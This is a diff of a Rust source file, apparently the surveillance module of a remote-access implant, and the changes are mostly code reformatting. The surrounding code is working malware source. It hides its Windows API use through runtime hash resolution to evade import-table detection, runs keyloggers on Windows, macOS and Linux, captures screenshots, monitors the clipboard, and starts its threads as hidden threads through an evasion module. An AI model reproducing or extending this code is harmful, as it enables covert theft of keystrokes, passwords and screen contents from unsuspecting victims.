@@ -50,10 +50,16 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
         Some(m) => m,
         None => {
             let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
-                resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
+                resolve_api(
+                    pe_resolve::HASH_KERNEL32_DLL,
+                    pe_resolve::hash_str(b"LoadLibraryW\0"),
+                )?;
             let m = load_library_w(dll_wide.as_ptr()) as usize;
             if m == 0 {
-                return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
+                return Err(anyhow!(
+                    "LoadLibraryW failed for DLL (hash 0x{:08X})",
+                    dll_hash
+                ));
             }
             m
         }
@@ -64,86 +70,144 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
 }
 
 // ── user32.dll wide string & hash ─────────────────────────────────────────────
-const USER32_DLL_W: &[u16] = &['u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const USER32_DLL_W: &[u16] = &[
+    'u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16,
+    'l' as u16, 'l' as u16, 0,
+];
 const HASH_USER32_DLL: u32 = hash_wstr_const(USER32_DLL_W);
 
 // ── API hash constants (user32) ───────────────────────────────────────────────
-const HASH_GETDC: u32                      = hash_str_const(b"GetDC\0");
-const HASH_RELEASEDC: u32                  = hash_str_const(b"ReleaseDC\0");
-const HASH_GETSYSTEMMETRICS: u32           = hash_str_const(b"GetSystemMetrics\0");
-const HASH_GETMONITORINFOW: u32            = hash_str_const(b"GetMonitorInfoW\0");
-const HASH_ENUMDISPLAYMONITORS: u32        = hash_str_const(b"EnumDisplayMonitors\0");
-const HASH_SETWINDOWSHOOKEXW: u32          = hash_str_const(b"SetWindowsHookExW\0");
-const HASH_CALLNEXTHOOKEX: u32             = hash_str_const(b"CallNextHookEx\0");
-const HASH_PEEKMESSAGEW: u32               = hash_str_const(b"PeekMessageW\0");
-const HASH_TRANSLATEMESSAGE: u32           = hash_str_const(b"TranslateMessage\0");
-const HASH_DISPATCHMESSAGEW: u32           = hash_str_const(b"DispatchMessageW\0");
-const HASH_UNHOOKWINDOWSHOOKEX: u32        = hash_str_const(b"UnhookWindowsHookEx\0");
+const HASH_GETDC: u32 = hash_str_const(b"GetDC\0");
+const HASH_RELEASEDC: u32 = hash_str_const(b"ReleaseDC\0");
+const HASH_GETSYSTEMMETRICS: u32 = hash_str_const(b"GetSystemMetrics\0");
+const HASH_GETMONITORINFOW: u32 = hash_str_const(b"GetMonitorInfoW\0");
+const HASH_ENUMDISPLAYMONITORS: u32 = hash_str_const(b"EnumDisplayMonitors\0");
+const HASH_SETWINDOWSHOOKEXW: u32 = hash_str_const(b"SetWindowsHookExW\0");
+const HASH_CALLNEXTHOOKEX: u32 = hash_str_const(b"CallNextHookEx\0");
+const HASH_PEEKMESSAGEW: u32 = hash_str_const(b"PeekMessageW\0");
+const HASH_TRANSLATEMESSAGE: u32 = hash_str_const(b"TranslateMessage\0");
+const HASH_DISPATCHMESSAGEW: u32 = hash_str_const(b"DispatchMessageW\0");
+const HASH_UNHOOKWINDOWSHOOKEX: u32 = hash_str_const(b"UnhookWindowsHookEx\0");
 const HASH_GETCLIPBOARDSEQUENCENUMBER: u32 = hash_str_const(b"GetClipboardSequenceNumber\0");
-const HASH_OPENCLIPBOARD: u32              = hash_str_const(b"OpenClipboard\0");
-const HASH_CLOSECLIPBOARD: u32             = hash_str_const(b"CloseClipboard\0");
-const HASH_GETCLIPBOARDDATA: u32           = hash_str_const(b"GetClipboardData\0");
+const HASH_OPENCLIPBOARD: u32 = hash_str_const(b"OpenClipboard\0");
+const HASH_CLOSECLIPBOARD: u32 = hash_str_const(b"CloseClipboard\0");
+const HASH_GETCLIPBOARDDATA: u32 = hash_str_const(b"GetClipboardData\0");
 
 // ── API hash constants (kernel32) ─────────────────────────────────────────────
-const HASH_GLOBALLOCK: u32                 = hash_str_const(b"GlobalLock\0");
-const HASH_GLOBALUNLOCK: u32               = hash_str_const(b"GlobalUnlock\0");
-const HASH_GETMODULEHANDLEW: u32           = hash_str_const(b"GetModuleHandleW\0");
+const HASH_GLOBALLOCK: u32 = hash_str_const(b"GlobalLock\0");
+const HASH_GLOBALUNLOCK: u32 = hash_str_const(b"GlobalUnlock\0");
+const HASH_GETMODULEHANDLEW: u32 = hash_str_const(b"GetModuleHandleW\0");
 
 // ── Function pointer types (user32) ───────────────────────────────────────────
-type FnGetDC                      = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
-type FnReleaseDC                  = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
-type FnGetSystemMetrics           = unsafe extern "system" fn(i32) -> i32;
+type FnGetDC = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnReleaseDC = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
+type FnGetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
 #[cfg(target_os = "windows")]
-type FnGetMonitorInfoW            = unsafe extern "system" fn(crate::win_types::HMONITOR, *mut crate::win_types::MONITORINFO) -> crate::win_types::BOOL;
+type FnGetMonitorInfoW = unsafe extern "system" fn(
+    crate::win_types::HMONITOR,
+    *mut crate::win_types::MONITORINFO,
+) -> crate::win_types::BOOL;
 #[cfg(target_os = "windows")]
-type FnEnumDisplayMonitors        = unsafe extern "system" fn(crate::win_types::HDC, *mut std::ffi::c_void, Option<unsafe extern "system" fn(crate::win_types::HMONITOR, crate::win_types::HDC, crate::win_types::LPRECT, crate::win_types::LPARAM) -> crate::win_types::BOOL>, crate::win_types::LPARAM) -> crate::win_types::BOOL;
-type FnSetWindowsHookExW          = unsafe extern "system" fn(i32, Option<unsafe extern "system" fn(i32, usize, isize) -> isize>, *mut std::ffi::c_void, u32) -> *mut std::ffi::c_void;
-type FnCallNextHookEx             = unsafe extern "system" fn(*mut std::ffi::c_void, i32, usize, isize) -> isize;
+type FnEnumDisplayMonitors = unsafe extern "system" fn(
+    crate::win_types::HDC,
+    *mut std::ffi::c_void,
+    Option<
+        unsafe extern "system" fn(
+            crate::win_types::HMONITOR,
+            crate::win_types::HDC,
+            crate::win_types::LPRECT,
+            crate::win_types::LPARAM,
+        ) -> crate::win_types::BOOL,
+    >,
+    crate::win_types::LPARAM,
+) -> crate::win_types::BOOL;
+type FnSetWindowsHookExW = unsafe extern "system" fn(
+    i32,
+    Option<unsafe extern "system" fn(i32, usize, isize) -> isize>,
+    *mut std::ffi::c_void,
+    u32,
+) -> *mut std::ffi::c_void;
+type FnCallNextHookEx =
+    unsafe extern "system" fn(*mut std::ffi::c_void, i32, usize, isize) -> isize;
 #[cfg(target_os = "windows")]
-type FnPeekMessageW               = unsafe extern "system" fn(*mut crate::win_types::MSG, *mut std::ffi::c_void, u32, u32, u32) -> crate::win_types::BOOL;
+type FnPeekMessageW = unsafe extern "system" fn(
+    *mut crate::win_types::MSG,
+    *mut std::ffi::c_void,
+    u32,
+    u32,
+    u32,
+) -> crate::win_types::BOOL;
 #[cfg(target_os = "windows")]
-type FnTranslateMessage           = unsafe extern "system" fn(*const crate::win_types::MSG) -> crate::win_types::BOOL;
+type FnTranslateMessage =
+    unsafe extern "system" fn(*const crate::win_types::MSG) -> crate::win_types::BOOL;
 #[cfg(target_os = "windows")]
-type FnDispatchMessageW           = unsafe extern "system" fn(*const crate::win_types::MSG) -> crate::win_types::LRESULT;
-type FnUnhookWindowsHookEx        = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnDispatchMessageW =
+    unsafe extern "system" fn(*const crate::win_types::MSG) -> crate::win_types::LRESULT;
+type FnUnhookWindowsHookEx = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 type FnGetClipboardSequenceNumber = unsafe extern "system" fn() -> u32;
-type FnOpenClipboard              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
-type FnCloseClipboard             = unsafe extern "system" fn() -> i32;
-type FnGetClipboardData           = unsafe extern "system" fn(u32) -> *mut std::ffi::c_void;
+type FnOpenClipboard = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnCloseClipboard = unsafe extern "system" fn() -> i32;
+type FnGetClipboardData = unsafe extern "system" fn(u32) -> *mut std::ffi::c_void;
 
 // ── Function pointer types (kernel32) ─────────────────────────────────────────
-type FnGlobalLock       = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
-type FnGlobalUnlock     = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnGlobalLock = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnGlobalUnlock = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 type FnGetModuleHandleW = unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void;
 
 // ── API hash constants & types (gdi32 — resolved at runtime, no IAT) ──────────
-const GDI32_DLL_W: &[u16] = &['g' as u16, 'd' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
-const HASH_GDI32_DLL: u32              = hash_wstr_const(GDI32_DLL_W);
-const HASH_BITBLT: u32                = hash_str_const(b"BitBlt\0");
+const GDI32_DLL_W: &[u16] = &[
+    'g' as u16, 'd' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16, 0,
+];
+const HASH_GDI32_DLL: u32 = hash_wstr_const(GDI32_DLL_W);
+const HASH_BITBLT: u32 = hash_str_const(b"BitBlt\0");
 const HASH_CREATECOMPATIBLEBITMAP: u32 = hash_str_const(b"CreateCompatibleBitmap\0");
-const HASH_CREATECOMPATIBLEDC: u32    = hash_str_const(b"CreateCompatibleDC\0");
-const HASH_DELETEDC: u32             = hash_str_const(b"DeleteDC\0");
-const HASH_DELETEOBJECT: u32          = hash_str_const(b"DeleteObject\0");
-const HASH_GETDIBITS: u32            = hash_str_const(b"GetDIBits\0");
-const HASH_SELECTOBJECT: u32          = hash_str_const(b"SelectObject\0");
+const HASH_CREATECOMPATIBLEDC: u32 = hash_str_const(b"CreateCompatibleDC\0");
+const HASH_DELETEDC: u32 = hash_str_const(b"DeleteDC\0");
+const HASH_DELETEOBJECT: u32 = hash_str_const(b"DeleteObject\0");
+const HASH_GETDIBITS: u32 = hash_str_const(b"GetDIBits\0");
+const HASH_SELECTOBJECT: u32 = hash_str_const(b"SelectObject\0");
 
-type FnBitBlt                = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32, i32, i32, *mut std::ffi::c_void, i32, i32, u32) -> i32;
-type FnCreateCompatibleBitmap = unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32) -> *mut std::ffi::c_void;
-type FnCreateCompatibleDC    = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
-type FnDeleteDC              = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
-type FnDeleteObject          = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnBitBlt = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    i32,
+    i32,
+    i32,
+    i32,
+    *mut std::ffi::c_void,
+    i32,
+    i32,
+    u32,
+) -> i32;
+type FnCreateCompatibleBitmap =
+    unsafe extern "system" fn(*mut std::ffi::c_void, i32, i32) -> *mut std::ffi::c_void;
+type FnCreateCompatibleDC =
+    unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnDeleteDC = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+type FnDeleteObject = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 #[cfg(target_os = "windows")]
-type FnGetDIBits             = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void, *mut crate::win_types::BITMAPINFO, u32) -> i32;
-type FnSelectObject          = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
+type FnGetDIBits = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    *mut std::ffi::c_void,
+    u32,
+    u32,
+    *mut std::ffi::c_void,
+    *mut crate::win_types::BITMAPINFO,
+    u32,
+) -> i32;
+type FnSelectObject = unsafe extern "system" fn(
+    *mut std::ffi::c_void,
+    *mut std::ffi::c_void,
+) -> *mut std::ffi::c_void;
 
 // ── Local constants (replacing IAT-producing winapi imports) ──────────────────
-const SM_CXSCREEN: i32       = 0;
-const SM_CYSCREEN: i32       = 1;
-const WH_KEYBOARD_LL: i32    = 13;
-const PM_REMOVE: u32         = 0x0001;
-const CF_UNICODETEXT: u32    = 13;
-const CF_TEXT: u32           = 1;
-const WM_QUIT: u32           = 0x0012;
+const SM_CXSCREEN: i32 = 0;
+const SM_CYSCREEN: i32 = 1;
+const WH_KEYBOARD_LL: i32 = 13;
+const PM_REMOVE: u32 = 0x0001;
+const CF_UNICODETEXT: u32 = 13;
+const CF_TEXT: u32 = 1;
+const WM_QUIT: u32 = 0x0012;
 
 // ── macOS keylogger FFI types/constants ─────────────────────────────────────
 #[cfg(target_os = "macos")]
@@ -227,8 +291,7 @@ lazy_static! {
 
 #[cfg(target_os = "macos")]
 lazy_static! {
-    static ref MAC_KEYLOGGER_BUFFER: Mutex<Option<Arc<Mutex<EncryptedBuffer>>>> =
-        Mutex::new(None);
+    static ref MAC_KEYLOGGER_BUFFER: Mutex<Option<Arc<Mutex<EncryptedBuffer>>>> = Mutex::new(None);
 }
 
 #[cfg(target_os = "macos")]
@@ -266,14 +329,15 @@ pub fn capture_screenshot(monitor_index: Option<u32>) -> Result<Vec<u8>> {
 
 #[cfg(target_os = "windows")]
 fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
-    use crate::win_types::{HBITMAP, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
+    use crate::win_types::{
+        BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, HBITMAP, SRCCOPY,
+    };
 
     unsafe {
         // Resolve user32 functions at runtime
         let get_system_metrics: FnGetSystemMetrics =
             resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETSYSTEMMETRICS)?;
-        let get_dc: FnGetDC =
-            resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETDC)?;
+        let get_dc: FnGetDC = resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETDC)?;
         let release_dc: FnReleaseDC =
             resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_RELEASEDC)?;
 
@@ -284,8 +348,7 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
             resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_CREATECOMPATIBLEBITMAP)?;
         let select_object: FnSelectObject =
             resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_SELECTOBJECT)?;
-        let bitblt: FnBitBlt =
-            resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_BITBLT)?;
+        let bitblt: FnBitBlt = resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_BITBLT)?;
         let get_di_bits: FnGetDIBits =
             resolve_api_or_load(GDI32_DLL_W, HASH_GDI32_DLL, HASH_GETDIBITS)?;
         let delete_object: FnDeleteObject =
@@ -295,16 +358,19 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
 
         let (x, y, width, height) = if let Some(idx) = monitor_index {
             let monitors = enumerate_monitors();
-            let mon = monitors
-                .get(idx as usize)
-                .ok_or_else(|| {
-                    anyhow!(
-                        "monitor index {} out of range ({} monitors)",
-                        idx,
-                        monitors.len()
-                    )
-                })?;
-            (mon.left, mon.top, mon.right - mon.left, mon.bottom - mon.top)
+            let mon = monitors.get(idx as usize).ok_or_else(|| {
+                anyhow!(
+                    "monitor index {} out of range ({} monitors)",
+                    idx,
+                    monitors.len()
+                )
+            })?;
+            (
+                mon.left,
+                mon.top,
+                mon.right - mon.left,
+                mon.bottom - mon.top,
+            )
         } else {
             let w = get_system_metrics(SM_CXSCREEN);
             let h = get_system_metrics(SM_CYSCREEN);
@@ -390,12 +456,9 @@ fn capture_screenshot_windows(monitor_index: Option<u32>) -> Result<Vec<u8>> {
             chunk.swap(0, 2);
         }
 
-        let img = image::ImageBuffer::<image::Rgba<u8>, _>::from_raw(
-            width as u32,
-            height as u32,
-            pixels,
-        )
-        .ok_or_else(|| anyhow!("failed to construct image buffer"))?;
+        let img =
+            image::ImageBuffer::<image::Rgba<u8>, _>::from_raw(width as u32, height as u32, pixels)
+                .ok_or_else(|| anyhow!("failed to construct image buffer"))?;
 
         let mut png_buf: Vec<u8> = Vec::new();
         img.write_to(
@@ -449,7 +512,8 @@ fn enumerate_monitors() -> Vec<MonitorRect> {
         _lprc: crate::win_types::LPRECT,
         dw_data: crate::win_types::LPARAM,
     ) -> crate::win_types::BOOL {
-        let get_monitor_info: FnGetMonitorInfoW = std::mem::transmute(GETMONITORINFO_PTR.load(Ordering::SeqCst));
+        let get_monitor_info: FnGetMonitorInfoW =
+            std::mem::transmute(GETMONITORINFO_PTR.load(Ordering::SeqCst));
         let mut mi: crate::win_types::MONITORINFO = std::mem::zeroed();
         mi.cb_size = std::mem::size_of::<crate::win_types::MONITORINFO>() as u32;
         if get_monitor_info(hmon, &mut mi) == 0 {
@@ -469,12 +533,7 @@ fn enumerate_monitors() -> Vec<MonitorRect> {
     }
 
     unsafe {
-        enum_display_monitors(
-            ptr::null_mut(),
-            ptr::null_mut(),
-            Some(enum_callback),
-            raw,
-        );
+        enum_display_monitors(ptr::null_mut(), ptr::null_mut(), Some(enum_callback), raw);
         GETMONITORINFO_PTR.store(0, Ordering::SeqCst);
         let monitors = Box::from_raw(raw as *mut Mutex<Vec<MonitorRect>>);
         monitors.into_inner().unwrap_or_default()
@@ -730,7 +789,8 @@ fn start_keylogger_thread_macos() {
                 return event;
             }
 
-            let key_code = unsafe { CGEventGetIntegerValueField(event, KCG_KEYBOARD_EVENT_KEYCODE) };
+            let key_code =
+                unsafe { CGEventGetIntegerValueField(event, KCG_KEYBOARD_EVENT_KEYCODE) };
             let pressed = event_type == KCG_EVENT_KEYDOWN;
             let ts = std::time::SystemTime::now()
                 .duration_since(std::time::UNIX_EPOCH)
@@ -823,7 +883,10 @@ fn start_keylogger_thread_linux(
             return;
         }
 
-        log::info!("surveillance: linux keylogger opened {} keyboard device(s)", devices.len());
+        log::info!(
+            "surveillance: linux keylogger opened {} keyboard device(s)",
+            devices.len()
+        );
 
         // 2. Poll all devices in a single loop using select()
         // We duplicate the Arc<Mutex<EncryptedBuffer>> into the loop.
@@ -854,7 +917,10 @@ fn start_keylogger_thread_linux(
                 let ev_type = u16::from_le_bytes([event_buf[16], event_buf[17]]);
                 let code = u16::from_le_bytes([event_buf[18], event_buf[19]]);
                 let value = i32::from_le_bytes([
-                    event_buf[20], event_buf[21], event_buf[22], event_buf[23],
+                    event_buf[20],
+                    event_buf[21],
+                    event_buf[22],
+                    event_buf[23],
                 ]);
 
                 if ev_type != EV_KEY {
@@ -930,25 +996,26 @@ fn enumerate_evdev_keyboards() -> Vec<(libc::c_int, String)> {
         // We need a buffer large enough for the evbits bitmap.
         // EV_MAX is typically 0x1F + 1 = 32, so 4 bytes is sufficient.
         let mut evbit: [u8; 4] = [0; 4];
-        let ioctl_ret = unsafe {
-            libc::ioctl(fd, EVIOCGBIT_EV as libc::c_ulong, &mut evbit)
-        };
+        let ioctl_ret = unsafe { libc::ioctl(fd, EVIOCGBIT_EV as libc::c_ulong, &mut evbit) };
 
         if ioctl_ret < 0 {
-            unsafe { libc::close(fd); };
+            unsafe {
+                libc::close(fd);
+            };
             continue;
         }
 
         // Check if EV_KEY (type 1) bit is set in the event type bitmap
         let ev_key_byte = (EV_KEY / 8) as usize;
         let ev_key_bit = EV_KEY % 8;
-        let has_ev_key = evbit.len() > ev_key_byte
-            && (evbit[ev_key_byte] & (1 << ev_key_bit)) != 0;
+        let has_ev_key = evbit.len() > ev_key_byte && (evbit[ev_key_byte] & (1 << ev_key_bit)) != 0;
 
         if has_ev_key {
             keyboards.push((fd, path));
         } else {
-            unsafe { libc::close(fd); };
+            unsafe {
+                libc::close(fd);
+            };
         }
     }
 
@@ -973,7 +1040,7 @@ fn start_keylogger_thread_windows(
     running: Arc<AtomicBool>,
 ) -> std::thread::JoinHandle<()> {
     crate::evasion::spawn_hidden_thread(move || {
-        use crate::win_types::{LPARAM, WPARAM, LRESULT};
+        use crate::win_types::{LPARAM, LRESULT, WPARAM};
 
         // Resolve user32 functions at runtime
         let call_next_hook_ex: FnCallNextHookEx = unsafe {
@@ -1073,7 +1140,8 @@ fn start_keylogger_thread_windows(
                     }
                 }
             }
-            let call_next: FnCallNextHookEx = std::mem::transmute(CALLNEXTHOOK_PTR.load(Ordering::SeqCst));
+            let call_next: FnCallNextHookEx =
+                std::mem::transmute(CALLNEXTHOOK_PTR.load(Ordering::SeqCst));
             call_next(std::ptr::null_mut(), n_code, w_param, l_param)
         }
 
@@ -1095,13 +1163,7 @@ fn start_keylogger_thread_windows(
             // Message pump — required for low-level hooks to work.
             let mut msg: crate::win_types::MSG = std::mem::zeroed();
             loop {
-                let has_msg = peek_message_w(
-                    &mut msg,
-                    std::ptr::null_mut(),
-                    0,
-                    0,
-                    PM_REMOVE,
-                );
+                let has_msg = peek_message_w(&mut msg, std::ptr::null_mut(), 0, 0, PM_REMOVE);
                 if has_msg != 0 {
                     if msg.message == WM_QUIT {
                         break;
@@ -1252,14 +1314,17 @@ fn start_clipboard_thread_windows(
     crate::evasion::spawn_hidden_thread(move || {
         // Resolve user32 functions at runtime
         let get_clipboard_seq: FnGetClipboardSequenceNumber = unsafe {
-            match resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETCLIPBOARDSEQUENCENUMBER) {
+            match resolve_api_or_load(
+                USER32_DLL_W,
+                HASH_USER32_DLL,
+                HASH_GETCLIPBOARDSEQUENCENUMBER,
+            ) {
                 Ok(f) => f,
                 Err(_) => return,
             }
         };
 
-        let mut last_sequence: u32 =
-            unsafe { get_clipboard_seq() };
+        let mut last_sequence: u32 = unsafe { get_clipboard_seq() };
 
         while running.load(Ordering::SeqCst) {
             std::thread::sleep(std::time::Duration::from_millis(interval_ms));
@@ -1342,22 +1407,17 @@ fn get_clipboard_windows() -> Result<String> {
     use std::os::windows::ffi::OsStringExt;
 
     // Resolve user32 functions at runtime
-    let open_clipboard: FnOpenClipboard = unsafe {
-        resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_OPENCLIPBOARD)?
-    };
-    let close_clipboard: FnCloseClipboard = unsafe {
-        resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_CLOSECLIPBOARD)?
-    };
-    let get_clipboard_data: FnGetClipboardData = unsafe {
-        resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETCLIPBOARDDATA)?
-    };
+    let open_clipboard: FnOpenClipboard =
+        unsafe { resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_OPENCLIPBOARD)? };
+    let close_clipboard: FnCloseClipboard =
+        unsafe { resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_CLOSECLIPBOARD)? };
+    let get_clipboard_data: FnGetClipboardData =
+        unsafe { resolve_api_or_load(USER32_DLL_W, HASH_USER32_DLL, HASH_GETCLIPBOARDDATA)? };
     // Resolve kernel32 functions
-    let global_lock: FnGlobalLock = unsafe {
-        resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GLOBALLOCK)?
-    };
-    let global_unlock: FnGlobalUnlock = unsafe {
-        resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GLOBALUNLOCK)?
-    };
+    let global_lock: FnGlobalLock =
+        unsafe { resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GLOBALLOCK)? };
+    let global_unlock: FnGlobalUnlock =
+        unsafe { resolve_api(pe_resolve::HASH_KERNEL32_DLL, HASH_GLOBALUNLOCK)? };
 
     // Store resolved functions for RAII guard access
     CLOSECLIPBOARD_PTR.store(close_clipboard as u64, Ordering::SeqCst);
@@ -1375,7 +1435,8 @@ fn get_clipboard_windows() -> Result<String> {
         impl Drop for CloseCbGuard {
             fn drop(&mut self) {
                 unsafe {
-                    let close_fn: FnCloseClipboard = std::mem::transmute(CLOSECLIPBOARD_PTR.load(Ordering::SeqCst));
+                    let close_fn: FnCloseClipboard =
+                        std::mem::transmute(CLOSECLIPBOARD_PTR.load(Ordering::SeqCst));
                     close_fn();
                 }
             }
@@ -1383,8 +1444,7 @@ fn get_clipboard_windows() -> Result<String> {
         let _close = CloseCbGuard;
 
         // Try CF_UNICODETEXT first
-        let handle =
-            get_clipboard_data(CF_UNICODETEXT);
+        let handle = get_clipboard_data(CF_UNICODETEXT);
         if !handle.is_null() {
             let lock_fn: FnGlobalLock = std::mem::transmute(GLOBALLOCK_PTR.load(Ordering::SeqCst));
             let ptr = lock_fn(handle) as *const u16;
@@ -1393,7 +1453,8 @@ fn get_clipboard_windows() -> Result<String> {
                 impl Drop for UnlockG {
                     fn drop(&mut self) {
                         unsafe {
-                            let unlock_fn: FnGlobalUnlock = std::mem::transmute(GLOBALUNLOCK_PTR.load(Ordering::SeqCst));
+                            let unlock_fn: FnGlobalUnlock =
+                                std::mem::transmute(GLOBALUNLOCK_PTR.load(Ordering::SeqCst));
                             unlock_fn(self.0);
                         }
                     }
@@ -1418,7 +1479,8 @@ fn get_clipboard_windows() -> Result<String> {
                 impl Drop for UnlockG {
                     fn drop(&mut self) {
                         unsafe {
-                            let unlock_fn: FnGlobalUnlock = std::mem::transmute(GLOBALUNLOCK_PTR.load(Ordering::SeqCst));
+                            let unlock_fn: FnGlobalUnlock =
+                                std::mem::transmute(GLOBALUNLOCK_PTR.load(Ordering::SeqCst));
                             unlock_fn(self.0);
                         }
                     }
